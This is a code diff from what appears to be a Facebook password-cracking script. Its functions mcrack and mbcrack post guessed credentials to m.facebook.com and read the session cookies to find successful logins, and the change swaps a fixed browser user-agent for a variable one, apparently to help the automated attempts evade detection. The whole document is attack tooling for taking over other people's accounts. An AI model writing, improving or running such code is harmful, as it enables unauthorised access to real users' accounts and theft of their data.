@@ -490,7 +490,7 @@ def mcrack(uid,pwx,tl):
             "sec-fetch-site": 'none',
             "sec-fetch-user": '?1',
             "upgrade-insecure-requests": '1',
-            "user-agent": 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
+            "user-agent": ua}
 			lo = session.post('https://m.facebook.com/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
@@ -675,7 +675,7 @@ def mbcrack(uid,pwx,tl):
             "sec-fetch-dest": 'empty',
             "sec-fetch-mode": 'cors',
             "sec-fetch-site": 'same-origin',
-            "user-agent": 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
+            "user-agent": ua}
 			lo = session.post('https://m.facebook.com/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
